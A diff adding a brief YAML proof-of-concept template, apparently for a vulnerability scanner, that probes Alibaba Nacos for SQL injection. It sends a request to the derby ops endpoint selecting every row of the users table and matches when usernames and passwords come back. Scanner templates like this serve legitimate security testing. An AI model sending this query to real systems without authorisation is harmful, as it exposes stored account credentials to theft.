@@ -1,0 +1,8 @@
+name: alibaba-nacos-config-server-sql-inject
+rules:
+  - method: GET
+    path: "/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"code":') &&response.body.bcontains(b'"USERNAME":') &&response.body.bcontains(b'"PASSWORD":')
+detail:
+  author: 666
